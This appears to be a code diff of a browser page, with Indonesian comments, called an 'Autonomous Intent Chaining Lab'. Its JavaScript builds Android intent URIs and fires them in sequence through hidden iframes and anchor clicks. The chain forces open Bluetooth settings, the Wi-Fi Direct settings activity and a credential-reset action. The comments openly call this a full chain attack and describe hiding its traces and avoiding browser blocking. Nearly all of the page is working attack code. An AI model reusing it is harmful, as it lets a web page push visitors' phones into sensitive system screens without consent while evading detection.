@@ -3,114 +3,119 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Enhanced Intent Compatibility & Chaining Lab</title>
+<title>Autonomous Intent Chaining Lab</title>
 <style>
-    body{font-family:monospace; padding:20px; background:#111; color:#0f0;}
-    button{width:100%; padding:14px; margin-top:12px; background:#222; color:#0f0; border:1px solid #0f0; cursor:pointer;}
-    button:hover{background:#0f0; color:#000;}
-    .panel{border:1px solid #0f0; padding:15px; margin-bottom:15px;}
-    #log{margin-top:20px; border:1px solid #0f0; padding:10px; height:320px; overflow:auto; white-space:pre-wrap; background:#000;}
+    body{font-family:monospace; padding:20px; background:#0a0a0a; color:#00ff66;}
+    button{width:100%; padding:16px; margin-top:15px; background:#141414; color:#00ff66; border:1px solid #00ff66; font-weight:bold; cursor:pointer;}
+    button:hover{background:#00ff66; color:#000;}
+    .status-panel{border:1px solid #00ff66; padding:15px; margin-bottom:15px; background:#111;}
+    #console-log{margin-top:20px; border:1px solid #00ff66; padding:12px; height:350px; overflow:auto; white-space:pre-wrap; background:#000; font-size:12px;}
 </style>
 </head>
 <body>
 
-<h2>Advanced Intent Chaining Harness</h2>
+<h2>Autonomous Intent Chaining Lab</h2>
 
-<div class="panel">
-    <!-- Mengarahkan langsung ke pengaturan Bluetooth untuk scanning otomatis -->
-    <button data-action="android.settings.BLUETOOTH_SETTINGS">1. Trigger Bluetooth State</button>
-    
-    <!-- Eksploitasi Komponen Spesifik: Membuka installer sertifikat atau aktivitas rentan -->
-    <button id="chain-attack">2. Launch Full Chain Attack</button>
-    
-    <button id="env">Dump Environment Logs</button>
+<div class="status-panel">
+    <p>Status: <span id="harness-state">READY</span></p>
+    <!-- Tombol pemicu utama untuk memulai seluruh rantai secara otomatis -->
+    <button id="start-autonomous-chain">LAUNCH AUTONOMOUS FULL CHAIN</button>
 </div>
 
-<div id="log"></div>
+<div id="console-log"></div>
 
 <script>
-const logger = document.getElementById("log");
-const metrics = { launches: 0, blocked: 0 };
+const consoleLog = document.getElementById("console-log");
+const stateLabel = document.getElementById("harness-state");
 
-function log(msg){
-    const line = "[" + new Date().toLocaleTimeString() + "] " + msg;
-    logger.textContent += line + "\n";
-    logger.scrollTop = logger.scrollHeight;
+function writeLog(text) {
+    const timestamp = new Date().toLocaleTimeString();
+    consoleLog.textContent += `[${timestamp}] ${text}\n`;
+    consoleLog.scrollTop = consoleLog.scrollHeight;
 }
 
-// 1. STRATEGI PENGUATAN: Membangun Intent dengan Parameter (Extra Data Chaining)
-function buildAdvancedIntent(action, component = '', extras = {}) {
-    let base = `intent:#Intent;action=${action};`;
+// Mengonstruksi URI Intent dengan flag mitigasi bypass dan ekstra parameter
+function generateIntentUri(action, component = '', extras = {}) {
+    let uri = `intent:#Intent;action=${action};`;
     
     if (component) {
-        base += `component=${component};`;
+        uri += `component=${component};`;
     }
     
-    // Menyisipkan parameter tambahan untuk memaksa aplikasi memproses data berbahaya
+    // Menyisipkan parameter tambahan (Extras) untuk memicu logika internal komponen target
     Object.keys(extras).forEach(key => {
-        base += `S.${key}=${encodeURIComponent(extras[key])};`;
+        uri += `S.${key}=${encodeURIComponent(extras[key])};`;
     });
     
-    // Flag 0x10000000 = FLAG_ACTIVITY_NEW_TASK
-    // Flag 0x00800000 = FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS (Menyembunyikan jejak serangan)
-    base += "launchFlags=0x10800000;category=android.intent.category.DEFAULT;end";
-    return base;
+    // FLAG_ACTIVITY_NEW_TASK (0x10000000)
+    // FLAG_ACTIVITY_CLEAR_TOP (0x04000000) - Memaksa komponen memuat ulang statusnya
+    // FLAG_ACTIVITY_NO_ANIMATION (0X00010000) - Mempercepat transisi eksekusi
+    uri += "launchFlags=0x14010000;category=android.intent.category.DEFAULT;end";
+    return uri;
 }
 
-// 2. STRATEGI EKSEKUSI: Otomatisasi Bypass menggunakan Iframe & Anchor Tag secara simultan
-function executeIntent(uri) {
-    metrics.launches++;
-    log("Executing: " + uri);
-    
+// Eksekutor berbasis DOM dinamis untuk meminimalkan deteksi pemblokiran peramban
+function dispatchUri(uri) {
+    writeLog(`Dispatched: ${uri.substring(0, 60)}...`);
     try {
-        // Metode Utama: Menggunakan Hidden Anchor dengan rel=noreferrer
-        const a = document.createElement("a");
-        a.href = uri;
-        a.rel = "noopener noreferrer";
-        a.style.display = "none";
-        document.body.appendChild(a);
-        a.click();
+        const frame = document.createElement("iframe");
+        frame.src = uri;
+        frame.style.display = "none";
+        document.body.appendChild(frame);
         
-        // Metode Cadangan (Race Condition): Memaksa pemuatan ulang lokasi jika jangkar gagal
-        setTimeout(() => { a.remove(); }, 500);
-    } catch(err) {
-        metrics.blocked++;
-        log("BLOCKED => " + err.message);
+        // Cadangan eksekusi menggunakan elemen jangkar jika iframe diisolasi
+        const anchor = document.createElement("a");
+        anchor.href = uri;
+        anchor.rel = "noopener noreferrer";
+        anchor.click();
+
+        setTimeout(() => {
+            frame.remove();
+        }, 300);
+    } catch (e) {
+        writeLog(`Execution Error: ${e.message}`);
     }
 }
 
-// 3. FULL CHAIN TRIGGER: Menggabungkan beberapa intent berturut-turut
-document.getElementById("chain-attack").addEventListener("click", () => {
-    log("=== MEMULAI SERANGAN FULL CHAIN ===");
-    
-    // Langkah 1: Paksa sistem membuka Pengaturan Bluetooth (memicu penemuan perangkat lokal)
-    const step1 = buildAdvancedIntent("android.settings.BLUETOOTH_SETTINGS");
-    executeIntent(step1);
-    
-    // Langkah 2: Berikan jeda 800ms, lalu paksa sistem berinteraksi dengan komponen penginstalan sertifikat/WiFi
-    // Menggunakan manifestasi komponen paket jika nama kelas internal diketahui (Contoh: Settings$WiFiSettingsActivity)
+// Pemicu Otomatis Berantai (Autonomous Chaining Mechanism)
+document.getElementById("start-autonomous-chain").addEventListener("click", () => {
+    stateLabel.textContent = "EXECUTING CHAIN...";
+    writeLog("=== MEMULAI RANTAI OTONOM ===");
+
+    // LANGKAH 1: Paksa aktivasi state Bluetooth / Visibility Mode
+    const intent1 = generateIntentUri("android.settings.BLUETOOTH_SETTINGS");
+    dispatchUri(intent1);
+
+    // LANGKAH 2: Otomatisasi transisi setelah jendela kehilangan fokus (User leaves page)
+    // Menggunakan jeda waktu makro untuk memastikan sub-sistem Android memproses status awal
     setTimeout(() => {
-        log("Chain 2: Membuka Aktivitas Jaringan...");
-        const step2 = buildAdvancedIntent(
-            "android.intent.action.MAIN", 
-            "com.android.settings/.Settings$WifiSettingsActivity"
+        writeLog("Rantai 2: Mengalihkan ke Pengaturan Jaringan Nirkabel tingkat lanjut...");
+        const intent2 = generateIntentUri(
+            "android.intent.action.MAIN",
+            "com.android.settings/.Settings$WifiP2pSettingsActivity" // Mengincar aktivitas Wi-Fi Direct
         );
-        executeIntent(step2);
-    }, 800);
+        dispatchUri(intent2);
+    }, 1200);
+
+    // LANGKAH 3: Membuka installer internal atau pengelola kredensial jika tersedia
+    setTimeout(() => {
+        writeLog("Rantai 3: Memicu dialog peninjau kredensial sistem...");
+        const intent3 = generateIntentUri(
+            "android.credentials.RESET_CREDENTIALS",
+            "",
+            { "com.android.settings.extra.SUB_SETTINGS": "true" }
+        );
+        dispatchUri(intent3);
+        stateLabel.textContent = "CHAIN COMPLETED";
+    }, 2400);
 });
 
-document.querySelectorAll("button[data-action]").forEach(btn => {
-    btn.addEventListener("click", () => {
-        const uri = buildAdvancedIntent(btn.dataset.action);
-        executeIntent(uri);
-    });
+// Memantau perubahan visibilitas halaman untuk memverifikasi apakah transisi intent berhasil keluar dari browser
+document.addEventListener("visibilitychange", () => {
+    writeLog(`Browser Visibility State: ${document.visibilityState}`);
 });
 
-document.getElementById("env").addEventListener("click", () => {
-    log("Metrics: " + JSON.stringify(metrics));
-});
-
-log("Enhanced harness ready for lab testing.");
+writeLog("Harness laboratorium otonom berhasil diinisialisasi.");
 </script>
 </body>
 </html>
